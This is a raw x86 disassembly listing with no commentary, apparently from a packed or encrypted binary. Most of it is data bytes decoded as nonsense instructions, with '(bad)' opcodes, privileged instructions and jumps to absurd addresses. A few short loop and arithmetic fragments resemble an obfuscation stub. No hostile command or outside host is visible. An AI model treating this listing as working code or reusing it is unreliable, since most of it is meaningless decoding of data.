  40a330:	mov    ds:0x6927ba4e,eax
  40a335:	es pop ss
  40a337:	or     esp,DWORD PTR [esi-0x67]
  40a33a:	and    dl,BYTE PTR [edi-0x1f8ab165]
  40a340:	or     al,0xfa
  40a342:	iret   
  40a343:	(bad)  
  40a344:	push   cs
  40a345:	jp     0x40a3c1
  40a347:	cmp    eax,0xe491926b
  40a34c:	pop    eax
  40a34d:	adc    ecx,0xcce40dba
  40a353:	xchg   BYTE PTR [ebx+eiz*2+0x31],ah
  40a357:	jb     0x40a324
  40a359:	push   eax
  40a35a:	cs xchg edx,eax
  40a35c:	push   esp
  40a35d:	sbb    eax,0x96154449
  40a362:	stos   DWORD PTR es:[edi],eax
  40a363:	push   ebx
  40a364:	rcr    DWORD PTR [edx-0x1b],1
  40a367:	hlt    
  40a368:	loopne 0x40a312
  40a36a:	mov    edi,edi
  40a36c:	push   edx
  40a36d:	fld    DWORD PTR [esi-0x44]
  40a370:	fcomp  DWORD PTR [ebp+ebx*4-0x7e]
  40a374:	sbb    esi,DWORD PTR [ecx]
  40a376:	clc    
  40a377:	repnz icebp 
  40a379:	mov    esp,0x7b151059
  40a37e:	cwde   
  40a37f:	adc    eax,0x5cb0d4ef
  40a384:	lods   eax,DWORD PTR ds:[esi]
  40a385:	fidiv  WORD PTR [ebx]
  40a387:	inc    ebp
  40a388:	(bad)  
  40a38a:	push   edi
  40a38b:	ficom  WORD PTR [edx+0x42]
  40a38e:	je     0x40a3ce
  40a390:	rcr    DWORD PTR [ebx-0xbf3d7f0],0xce
  40a397:	xchg   ebp,eax
  40a398:	mov    ds:0x227dd6de,al
  40a39d:	xchg   ebx,eax
  40a39e:	inc    edx
  40a39f:	mov    ds:0x7e5c7a87,al
  40a3a4:	je     0x40a33b
  40a3a6:	sbb    al,0xe2
  40a3a8:	or     ebx,ecx
  40a3aa:	mov    ebp,0xfa33c92a
  40a3af:	add    ecx,DWORD PTR [ebp-0x5b]
  40a3b2:	pushf  
  40a3b3:	mov    edx,0xc05a5720
  40a3b8:	pop    ds
  40a3b9:	lock lahf 
  40a3bb:	sbb    al,0x3
  40a3bd:	gs mov dh,0x76
  40a3c0:	repnz add BYTE PTR [ecx-0x5],ah
  40a3c4:	push   esp
  40a3c5:	cmp    DWORD PTR [esi-0xf131513],ecx
  40a3cb:	or     DWORD PTR [edx+0x64cc5724],ecx
  40a3d1:	sbb    ebp,eax
  40a3d3:	xchg   esi,eax
  40a3d4:	js     0x40a438
  40a3d6:	stos   BYTE PTR es:[edi],al
  40a3d7:	out    dx,al
  40a3d8:	inc    esi
  40a3d9:	jne    0x40a3bd
  40a3db:	dec    edi
  40a3dc:	sbb    DWORD PTR [ebp-0x40c1668],ecx
  40a3e2:	in     al,0xeb
  40a3e4:	xchg   ecx,eax
  40a3e5:	adc    ah,BYTE PTR [esi-0xbcb44bd]
  40a3eb:	in     al,dx
  40a3ec:	jo     0x40a428
  40a3ee:	push   0x40
  40a3f0:	das    
  40a3f1:	push   ebx
  40a3f2:	retf   0x6504
  40a3f5:	jmp    0x7f7334ac
  40a3fa:	or     esi,DWORD PTR [esi]
  40a3fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3fd:	push   esi
  40a3fe:	jno    0x40a442
  40a400:	lahf   
  40a401:	xchg   esi,eax
  40a402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a403:	scas   eax,DWORD PTR es:[edi]
  40a404:	inc    ebp
  40a405:	(bad)  
  40a406:	imul   edx,DWORD PTR [eax],0xf5ed33b7
  40a40c:	fimul  DWORD PTR [ebx-0x2fcc03ab]
  40a412:	adc    DWORD PTR ds:0x433773,0x43379f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x4337ab,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x4336e3
  40a440:	and    DWORD PTR ds:0x4337df,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x4337d7
  40a44f:	sbb    DWORD PTR ds:0x4336e7,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x433773,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x433727,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x433727
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x433727,ebx
  40a47f:	cmp    DWORD PTR ds:0x433727,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x433727,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x4337ef,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    ebx,DWORD PTR [ecx-0x75]
  40a4c3:	cdq    
  40a4c4:	nop
  40a4c5:	mov    edi,esi
  40a4c7:	jl     0x40a545
  40a4c9:	retf   0x7c79
  40a4cc:	jl     0x40a539
  40a4ce:	xor    al,0x32
  40a4d0:	jbe    0x40a538
  40a4d2:	dec    edi
  40a4d3:	cs stos DWORD PTR es:[edi],eax
  40a4d5:	cmp    DWORD PTR [ebp+eiz*8-0x74b7c6d0],ebx
  40a4dc:	(bad)  
  40a4dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4de:	pop    esp
  40a4df:	adc    DWORD PTR [ebx+0x56],edx
  40a4e2:	add    al,0x6e
  40a4e4:	jecxz  0x40a545
  40a4e6:	(bad)  
  40a4e7:	pop    eax
  40a4e8:	xchg   ebx,eax
  40a4e9:	fwait
  40a4ea:	sbb    ch,BYTE PTR [ecx+esi*8-0x6476afe4]
  40a4f1:	sub    dl,cl
  40a4f3:	and    al,0x98
  40a4f5:	cmp    ebp,esi
  40a4f7:	into   
  40a4f8:	cmp    esp,DWORD PTR [eax]
  40a4fa:	sub    eax,0x6f65c554
  40a4ff:	inc    eax
  40a500:	outs   dx,DWORD PTR ds:[esi]
  40a501:	or     DWORD PTR [edi+0x262307d],0xffffff80
  40a508:	loopne 0x40a54a
  40a50a:	out    0x6b,eax
  40a50c:	nop
  40a50d:	sbb    ecx,DWORD PTR [eax+0x77]
  40a510:	jb     0x40a55f
  40a512:	xor    BYTE PTR [ecx-0x4],ah
  40a515:	sbb    bh,BYTE PTR [ebp-0xa34aa47]
  40a51b:	daa    
  40a51c:	inc    ecx
  40a51d:	fadd   st,st(2)
  40a51f:	adc    eax,0x909476a8
  40a524:	dec    ecx
  40a525:	(bad)  
  40a526:	ds sbb dl,ah
  40a529:	lods   al,BYTE PTR ds:[esi]
  40a52a:	ret    
  40a52b:	cmp    al,0x12
  40a52d:	in     al,0x25
  40a52f:	neg    DWORD PTR [edx]
  40a531:	and    DWORD PTR [ebx+ebp*8-0x4211e3d8],esp
  40a538:	push   esi
  40a539:	lea    edx,[eax+0x152cbf5d]
  40a53f:	and    ch,0x3e
  40a542:	and    DWORD PTR [edx-0x2ebc5144],0x9878b8cd
  40a54c:	cwde   
  40a54d:	or     DWORD PTR [edi-0x61],esi
  40a550:	or     BYTE PTR [ebx+0x33183b27],0x57
  40a557:	xor    eax,0x39ddc9ac
  40a55c:	xchg   BYTE PTR [esi+0x75da3c61],bl
  40a562:	xchg   esp,eax
  40a563:	(bad)  
  40a564:	xchg   ecx,eax
  40a565:	cmp    BYTE PTR [esi+0x63],cl
  40a568:	push   eax
  40a569:	xor    bh,BYTE PTR [edi+0x10]
  40a56c:	test   eax,0x2502ea1b
  40a571:	ret    
  40a572:	sub    al,0x77
  40a574:	ds stos BYTE PTR es:[edi],al
  40a576:	xchg   edx,eax
  40a577:	inc    eax
  40a578:	stos   BYTE PTR es:[edi],al
  40a579:	sub    DWORD PTR [ebp-0x23],ecx
  40a57c:	in     eax,dx
  40a57d:	addr16 pop edi
  40a57f:	mov    al,0x82
  40a581:	push   cs
  40a582:	dec    eax
  40a583:	pop    ecx
  40a584:	imul   esp,DWORD PTR [edi],0x1
  40a587:	cdq    
  40a588:	inc    edi
  40a589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a58a:	fistp  WORD PTR [edi]
  40a58c:	ds stos DWORD PTR es:[edi],eax
  40a58e:	jmp    0x40a51f
  40a590:	jb     0x40a5dc
  40a592:	or     al,0x4a
  40a594:	imul   ebp,DWORD PTR [esi],0x3c
  40a597:	sub    WORD PTR [eax+0x41],0x23
  40a59c:	mov    al,ds:0x647dbf11
  40a5a1:	cdq    
  40a5a2:	popa   
  40a5a3:	mov    ecx,DWORD PTR [ebx+ecx*8-0x4f2b11a9]
  40a5aa:	xchg   ebp,eax
  40a5ab:	call   FWORD PTR [ebx+0x7a83af4]
  40a5b1:	lahf   
  40a5b2:	in     eax,0xeb
  40a5b4:	lods   al,BYTE PTR ds:[esi]
  40a5b5:	shr    BYTE PTR [edi+eiz*1-0x1c],cl
  40a5b9:	mov    al,0xd4
  40a5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5bc:	adc    ebp,DWORD PTR [ebp-0x59597272]
  40a5c2:	or     dh,BYTE PTR [edx+ebx*4+0x22b309a1]
  40a5c9:	xor    ax,0xc82c
  40a5cd:	int3   
  40a5ce:	mov    ah,0x53
  40a5d0:	mov    edi,0xeb66001c
  40a5d5:	imul   ebx,DWORD PTR [ebp-0x648c1871],0xffffffbc
  40a5dc:	adc    eax,0xe510e794
  40a5e1:	lahf   
  40a5e2:	mov    cl,0xbc
  40a5e4:	adc    BYTE PTR [ebx+0x5a],0xb0
  40a5e8:	mov    edx,0xbc37bcd0
  40a5ed:	mov    bh,0x97
  40a5ef:	fcomp  st(4)
  40a5f1:	jo     0x40a60f
  40a5f3:	int    0xa8
  40a5f5:	aam    0xeb
  40a5f7:	das    
  40a5f8:	push   0x3c
  40a5fa:	xor    ch,BYTE PTR [esi-0x63]
  40a5fd:	mov    edx,0x95527241
  40a602:	jg     0x40a60e
  40a604:	mov    WORD PTR [esi+0x342c6b76],fs
  40a60a:	clc    
  40a60b:	outs   dx,DWORD PTR ds:[esi]
  40a60c:	and    esp,DWORD PTR [esi+0xd47e204]
  40a612:	and    cl,BYTE PTR ds:0xfcc618b3
  40a618:	mov    al,ds:0x78920933
  40a61d:	cmp    BYTE PTR [ecx+0x3aca4266],dh
  40a623:	xlat   BYTE PTR ds:[ebx]
  40a624:	add    edx,DWORD PTR [esi-0x1ee44712]
  40a62a:	mov    ecx,edx
  40a62c:	(bad)  
  40a62f:	jmp    0xd36858e
  40a634:	aaa    
  40a635:	fnstenv [edx+0x56ff6f9d]
  40a63b:	jmp    0xc2bf:0xcb0087c0
  40a642:	add    eax,0x52f3022e
  40a647:	dec    ebp
  40a648:	sub    ebp,ecx
  40a64a:	xchg   ebx,eax
  40a64b:	loope  0x40a632
  40a64d:	mov    al,cs:0xe0259cc3
  40a653:	into   
  40a654:	cmp    ch,dh
  40a656:	push   edx
  40a657:	aam    0xa4
  40a659:	mov    dh,0xea
  40a65b:	test   DWORD PTR [ebp*8-0x45bf83e1],edx
  40a662:	xor    eax,ebp
  40a664:	iret   
  40a665:	push   0x7574b4fe
  40a66a:	xchg   ecx,eax
  40a66b:	or     esi,DWORD PTR [edx+0x55b88159]
  40a671:	nop
  40a672:	dec    edi
  40a673:	jne    0x40a6e2
  40a675:	std    
  40a676:	jbe    0x40a60a
  40a678:	retf   0xea2c
  40a67b:	xor    eax,DWORD PTR [eax]
  40a67d:	(bad)  
  40a67e:	jl     0x40a665
  40a680:	push   ecx
  40a681:	dec    esp
  40a682:	xchg   DWORD PTR [eax],esi
  40a684:	mov    ebx,0x24d410e4
  40a689:	inc    esi
  40a68a:	adc    DWORD PTR [ecx+0x5d],edx
  40a68d:	lock jae 0x40a6da
  40a690:	stc    
  40a691:	dec    edi
  40a692:	dec    DWORD PTR [eax-0x7b8c69a3]
  40a698:	mov    ecx,0x483ce8b0
  40a69d:	cmp    eax,0x91b9168c
  40a6a2:	pop    edx
  40a6a3:	cmc    
  40a6a4:	test   al,0xd6
  40a6a6:	aam    0x1f
  40a6a8:	fldcw  WORD PTR [eax-0x649ceea3]
  40a6ae:	jbe    0x40a6a4
  40a6b0:	cld    
  40a6b1:	sbb    ch,al
  40a6b3:	fist   DWORD PTR [esi+ebp*4-0xdd21da4]
  40a6ba:	inc    edx
  40a6bb:	sti    
  40a6bc:	mov    ds:0x3810218b,al
  40a6c1:	js     0x40a6a1
  40a6c3:	jl     0x40a737
  40a6c5:	fst    QWORD PTR [edx+0x4e4f54cc]
  40a6cb:	nop
  40a6cc:	add    ah,ch
  40a6ce:	icebp  
  40a6cf:	(bad)  
  40a6d1:	mov    dh,0xd9
  40a6d3:	ss (bad) 
  40a6d5:	fnstenv [ebp-0x4b]
  40a6d8:	jmp    0xc4caffd7
  40a6dd:	push   ebp
  40a6de:	and    al,0x97
  40a6e0:	mov    dl,0x92
  40a6e2:	scas   al,BYTE PTR es:[edi]
  40a6e3:	sahf   
  40a6e4:	xor    BYTE PTR [edi+0x7d],ah
  40a6e7:	mov    edi,ebp
  40a6e9:	pusha  
  40a6ea:	or     esp,ebx
  40a6ec:	stos   DWORD PTR es:[edi],eax
  40a6ed:	mov    edi,0x82b6bba5
  40a6f2:	sbb    BYTE PTR ds:0x820e330b,ah
  40a6f8:	mov    cl,0xe8
  40a6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6fb:	pop    esp
  40a6fc:	inc    ebx
  40a6fd:	adc    esp,ecx
  40a6ff:	mov    eax,DWORD PTR [edx]
  40a701:	test   eax,0xc21ef533
  40a706:	dec    ebp
  40a707:	(bad)  
  40a708:	mov    dl,0x10
  40a70a:	loop   0x40a75d
  40a70c:	call   0x29c0:0xedacaa13
  40a713:	in     eax,dx
  40a714:	dec    eax
  40a715:	adc    edx,DWORD PTR [edi+0x3af4e9cc]
  40a71b:	pop    esp
  40a71c:	push   esp
  40a71d:	push   es
  40a71e:	jp     0x40a749
  40a720:	push   ebp
  40a721:	mov    ds:0xf5773412,al
  40a726:	icebp  
  40a727:	clc    
  40a728:	inc    esi
  40a729:	and    bh,cl
  40a72b:	or     al,0x75
  40a72d:	and    ah,BYTE PTR [ebx]
  40a72f:	xchg   ebp,eax
  40a730:	mov    ecx,0xb012d4a5
  40a735:	not    BYTE PTR [esi]
  40a737:	adc    BYTE PTR [ecx],0x10
  40a73a:	rep ins DWORD PTR es:[edi],dx
  40a73c:	dec    ebx
  40a73d:	in     eax,0x5e
  40a73f:	call   0xdef9:0x93773cc9
  40a746:	sahf   
  40a747:	pop    eax
  40a748:	add    edi,DWORD PTR [ecx-0x2f2bb9aa]
  40a74e:	jno    0x40a752
  40a750:	cmp    al,0x9c
  40a752:	into   
  40a753:	loope  0x40a726
  40a755:	and    DWORD PTR [ebx],edx
  40a757:	xrelease xchg BYTE PTR [ebx-0x10],bl
  40a75b:	cmp    DWORD PTR [esi],edx
  40a75d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a75e:	push   es
  40a75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a760:	add    al,0x8b
  40a762:	xchg   ebp,eax
  40a763:	lahf   
  40a764:	into   
  40a765:	add    ecx,DWORD PTR [ebp-0x3d]
  40a768:	xor    ebx,DWORD PTR ds:0xa579fac8
  40a76e:	add    al,0x88
  40a770:	jmp    0x40a72d
  40a772:	push   ebp
  40a773:	sbb    al,0x93
  40a775:	shr    BYTE PTR [ecx+0x13c42245],0x6b
  40a77c:	not    BYTE PTR [ebp-0x41]
  40a77f:	xor    DWORD PTR [ecx],ecx
  40a781:	fbstp  TBYTE PTR [esi-0x28a14e93]
  40a787:	fwait
  40a788:	inc    edx
  40a789:	neg    BYTE PTR [ecx]
  40a78b:	adc    esp,ebx
  40a78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a78e:	pop    ebx
  40a78f:	retf   
  40a790:	push   0xffffff96
  40a792:	xor    DWORD PTR [edx],ebx
  40a794:	cmp    DWORD PTR [ebp-0x52abf1bc],esi
  40a79a:	adc    eax,0x93a35e6b
  40a79f:	stos   DWORD PTR es:[edi],eax
  40a7a0:	daa    
  40a7a1:	aas    
  40a7a2:	outs   dx,BYTE PTR ds:[esi]
  40a7a3:	mov    ecx,0xacc2b7c4
  40a7a8:	retf   0x2085
  40a7ab:	mov    ds:0xf273f666,eax
  40a7b0:	out    0x7c,al
  40a7b2:	jl     0x40a82f
  40a7b4:	fcomp  DWORD PTR [edi+edx*1+0x29]
  40a7b8:	mov    eax,ds:0xe03f8c5a
  40a7bd:	mov    esp,0x47ccdf42
  40a7c2:	fs mov bh,0xa1
  40a7c5:	nop
  40a7c6:	dec    ecx
  40a7c7:	xlat   BYTE PTR ds:[ebx]
  40a7c8:	stos   DWORD PTR es:[edi],eax
  40a7c9:	sbb    cl,BYTE PTR [eax-0x7375ab6c]
  40a7cf:	dec    esi
  40a7d0:	jle    0x40a7fe
  40a7d2:	nop
  40a7d3:	or     al,BYTE PTR [edx+0x17]
  40a7d6:	pop    edx
  40a7d7:	sub    esp,DWORD PTR [eax]
  40a7d9:	out    0x9b,al
  40a7db:	daa    
  40a7dc:	ret    
  40a7dd:	add    edi,esi
  40a7df:	jge    0x40a771
  40a7e1:	fdiv   st(1),st
  40a7e3:	cmc    
  40a7e4:	dec    esp
  40a7e5:	(bad)  
  40a7e6:	jl     0x40a858
  40a7e8:	popf   
  40a7e9:	shl    ecx,cl
  40a7eb:	inc    ecx
  40a7ec:	dec    edx
  40a7ed:	jbe    0x40a79f
  40a7ef:	jns    0x40a82d
  40a7f1:	sbb    BYTE PTR [edi-0x68ee7564],ch
  40a7f7:	adc    bh,dh
  40a7f9:	adc    DWORD PTR [eax+0x25],esi
  40a7fc:	out    dx,eax
  40a7fd:	(bad)  
  40a7fe:	jmp    0x644b:0x184a036c
  40a805:	mov    ecx,0xf24b266e
  40a80a:	mov    ds:0x87f1b60a,al
  40a80f:	and    DWORD PTR [esi-0x50],edx
  40a812:	pop    eax
  40a813:	add    ebx,ebx
  40a815:	dec    ecx
  40a816:	adc    bl,BYTE PTR [esp+eax*8]
  40a819:	lods   eax,DWORD PTR ds:[esi]
  40a81a:	push   es
  40a81b:	sbb    eax,0x3238df65
  40a820:	cmp    DWORD PTR [ebx+esi*2+0xf],esp
  40a824:	scas   eax,DWORD PTR es:[edi]
  40a825:	xlat   BYTE PTR ds:[ebx]
  40a826:	adc    DWORD PTR ds:0x43372f,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x43372b,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x43376f,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433717
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x43375f,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x43372f,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x4337a3
  40a878:	sub    ebx,DWORD PTR ds:0x4336cf
  40a87e:	mov    DWORD PTR ds:0x4337a3,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433717,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433797
  40a89b:	adc    DWORD PTR ds:0x4336d3,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x433727,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	outs   dx,BYTE PTR ds:[esi]
  40a8e2:	cmp    al,0xf2
  40a8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a8f1
  40a8ee:	cmc    
  40a8ef:	les    edi,FWORD PTR [edi-0x2c]
  40a8f2:	inc    ebp
  40a8f3:	mov    edx,0x40793791
  40a8f8:	clc    
  40a8f9:	pop    edx
  40a8fa:	dec    edi
  40a8fb:	push   edi
  40a8fc:	mov    dh,0x11
  40a8fe:	test   al,0x5a
  40a900:	xchg   edi,eax
  40a901:	fs aaa 
  40a903:	inc    esp
  40a904:	retf   
  40a905:	popf   
  40a906:	mov    eax,0x62e64ba4
  40a90b:	xor    BYTE PTR [edx+0x3ce28f03],0xad
  40a912:	ret    0xefc3
  40a915:	shl    DWORD PTR [ebp-0xb],1
  40a918:	mov    ebx,0x641892df
  40a91d:	xor    al,0xee
  40a91f:	mov    DWORD PTR [ebx],esp
  40a921:	enter  0x9586,0xac
  40a925:	enter  0x5f5a,0x93
  40a929:	and    DWORD PTR [eax],edi
  40a92b:	cdq    
  40a92c:	jbe    0x40a91f
  40a92e:	cmc    
  40a92f:	inc    ecx
  40a930:	retf   0x9846
  40a933:	(bad)  
  40a934:	loope  0x40a900
  40a936:	sbb    eax,0xf97b01a
  40a93b:	xor    al,0x75
  40a93d:	dec    ecx
  40a93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a93f:	pop    esi
  40a940:	or     DWORD PTR [esi-0x5b],edx
  40a943:	mov    ecx,0xb8719975
  40a948:	push   ss
  40a949:	sub    al,BYTE PTR [esi+0x3c]
  40a94c:	pusha  
  40a94d:	inc    edi
  40a94e:	loopne 0x40a92f
  40a950:	cli    
  40a951:	add    ch,bh
  40a953:	or     ch,ah
  40a955:	shl    esp,cl
  40a957:	or     cl,BYTE PTR [ebx+0x0]
  40a95a:	aaa    
  40a95b:	cli    
  40a95c:	dec    si
  40a95e:	adc    al,0xfb
  40a960:	cmp    al,0x79
  40a962:	and    BYTE PTR [ebp+0xc293037],bh
  40a968:	repz (bad) 
  40a96a:	hlt    
  40a96b:	xor    ah,BYTE PTR [ecx]
  40a96d:	lahf   
  40a96e:	bound  ebx,QWORD PTR [ebx+0x6a]
  40a971:	stos   BYTE PTR es:[edi],al
  40a972:	cli    
  40a973:	imul   edx,DWORD PTR [ecx-0x30ee5f53],0x86165c09
  40a97d:	push   edi
  40a97e:	push   cs
  40a97f:	je     0x40a96b
  40a981:	jne    0x40a91a
  40a983:	shl    BYTE PTR [esi+0x73f7e23e],0x8
  40a98a:	mov    edi,0x5736cb91
  40a98f:	scas   eax,DWORD PTR es:[edi]
  40a990:	mov    esi,0xc4e5bdbb
  40a995:	cmp    eax,0xb1ecf2ea
  40a99a:	test   al,0xb7
  40a99c:	pop    ecx
  40a99d:	rol    BYTE PTR [edi],0xa2
  40a9a0:	jbe    0x40a99f
  40a9a2:	hlt    
  40a9a3:	dec    eax
  40a9a4:	mov    ebp,edi
  40a9a6:	ror    esp,1
  40a9a8:	shr    DWORD PTR [ebx+eiz*8],cl
  40a9ab:	add    al,0x3a
  40a9ad:	pushf  
  40a9ae:	jl     0x40a963
  40a9b0:	mov    ch,0xab
  40a9b2:	adc    DWORD PTR [edi+0x65251de4],esi
  40a9b8:	std    
  40a9b9:	add    DWORD PTR [ecx],ebx
  40a9bb:	adc    esi,DWORD PTR [ecx]
  40a9bd:	or     DWORD PTR [ecx-0x44],ebx
  40a9c0:	xchg   edi,eax
  40a9c1:	pop    ebp
  40a9c2:	add    BYTE PTR [esi-0x4f2a568],al
  40a9c8:	sbb    al,0xb5
  40a9ca:	or     DWORD PTR [ecx-0x52],ecx
  40a9cd:	xor    DWORD PTR [edi-0x476fa0c],edx
  40a9d3:	iret   
  40a9d4:	jecxz  0x40a995
  40a9d6:	jae    0x40aa2b
  40a9d8:	ss add edi,esi
  40a9db:	hlt    
  40a9dc:	call   0x615d:0x952fb272
  40a9e3:	mov    esi,0xd7832985
  40a9e8:	dec    esi
  40a9e9:	fisttp QWORD PTR [ebx+0x7c6cc73b]
  40a9ef:	pop    ebp
  40a9f0:	call   0x4bc:0xbf7385e7
  40a9f7:	mov    dh,0x4f
  40a9f9:	add    edx,ebp
  40a9fb:	jmp    0x40a9be
  40a9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9fe:	outs   dx,BYTE PTR ds:[esi]
  40a9ff:	cdq    
  40aa00:	xchg   esi,eax
  40aa01:	addr16 and esi,0x9
  40aa05:	xchg   edi,eax
  40aa06:	call   FWORD PTR [eax]
  40aa08:	scas   eax,DWORD PTR es:[edi]
  40aa09:	mov    cl,0x5c
  40aa0b:	jge    0x40a9a7
  40aa0d:	inc    ecx
  40aa0e:	pop    ss
  40aa0f:	(bad)  
  40aa11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa12:	mov    edi,0xdccbbda9
  40aa17:	or     bh,bl
  40aa19:	pop    ds
  40aa1a:	xor    BYTE PTR [edx+edx*8],al
  40aa1d:	pop    es
  40aa1e:	ret    0x73f9
  40aa21:	mov    esi,0x74aa8003
  40aa26:	fstp   DWORD PTR [edi]
  40aa28:	mov    eax,ds:0x6c41a5ef
  40aa2d:	push   es
  40aa2e:	std    
  40aa2f:	jne    0x40a9cd
  40aa31:	lock arpl WORD PTR gs:[esi-0x75cca46f],si
  40aa39:	loopne 0x40aa4e
  40aa3b:	mov    esp,0x8c7d1fa4
  40aa40:	dec    eax
  40aa41:	ret    0xc5d3
  40aa44:	mov    ebx,0xbb49e09b
  40aa49:	lea    esi,[ecx-0x70d28db6]
  40aa4f:	mov    al,0xb4
  40aa51:	mov    eax,ds:0x79d9a32c
  40aa56:	stos   DWORD PTR es:[edi],eax
  40aa57:	fistp  WORD PTR [eax-0x7028178]
  40aa5d:	sub    al,0xa7
  40aa5f:	imul   ebp,DWORD PTR [ebp+0x8af7c9c],0xffffff96
  40aa66:	lock sar ebp,0xe9
  40aa6a:	fdivr  st(4),st
  40aa6d:	jnp    0x40aae0
  40aa6f:	aaa    
  40aa70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa71:	dec    ebx
  40aa72:	jecxz  0x40aab4
  40aa74:	push   ebp
  40aa75:	inc    ebx
  40aa76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa77:	push   edx
  40aa78:	stc    
  40aa79:	loopne 0x40aacf
  40aa7b:	dec    ebx
  40aa7c:	add    cl,BYTE PTR [edi+0x1d]
  40aa7f:	or     DWORD PTR [esi],esi
  40aa81:	and    edx,DWORD PTR cs:[esp+edi*4-0x1]
  40aa86:	mov    dl,BYTE PTR [eax]
  40aa88:	ret    
  40aa89:	das    
  40aa8a:	xchg   BYTE PTR [eax],dh
  40aa8c:	mov    es,WORD PTR [ebp-0x6c]
  40aa8f:	dec    ecx
  40aa90:	pop    esi
  40aa91:	rcr    BYTE PTR [ebx],0x61
  40aa94:	cwde   
  40aa95:	jno    0x40ab0d
  40aa97:	stos   BYTE PTR es:[edi],al
  40aa98:	mov    bl,0x1
  40aa9a:	jecxz  0x40aaf6
  40aa9c:	pushf  
  40aa9d:	inc    edx
  40aa9e:	and    BYTE PTR [edi],dl
  40aaa0:	or     BYTE PTR [esi+0x7713193],0xba
  40aaa7:	(bad)  
  40aaa8:	mov    BYTE PTR [eax-0xd],ah
  40aaab:	std    
  40aaac:	aas    
  40aaad:	dec    edx
  40aaae:	jbe    0x40aa43
  40aab0:	iret   
  40aab1:	mov    ss,esi
  40aab3:	push   ecx
  40aab4:	(bad)  
  40aab5:	sub    al,0xb1
  40aab7:	sbb    eax,0xfc73f17f
  40aabc:	xchg   ebp,eax
  40aabd:	fisttp DWORD PTR [ecx]
  40aabf:	xchg   esi,eax
  40aac0:	sahf   
  40aac1:	push   0xffffffd4
  40aac3:	cmp    BYTE PTR [edi-0x5],bh
  40aac6:	nop
  40aac7:	lahf   
  40aac8:	add    dh,BYTE PTR [edi]
  40aaca:	(bad)  
  40aacb:	jmp    0xe19fd49e
  40aad0:	das    
  40aad1:	mov    eax,ds:0x394686e9
  40aad6:	leave  
  40aad7:	mov    al,0x45
  40aad9:	mov    eax,ds:0x45e872a4
  40aade:	mov    ebx,0x10d31a1c
  40aae3:	popa   
  40aae4:	mov    eax,ebx
  40aae6:	sub    bh,BYTE PTR [esi+0x49]
  40aae9:	nop    ecx
  40aaec:	cld    
  40aaed:	sub    eax,0xc42a1b59
  40aaf2:	mov    ebp,0xa2c9fc45
  40aaf7:	int    0xe7
  40aaf9:	fwait
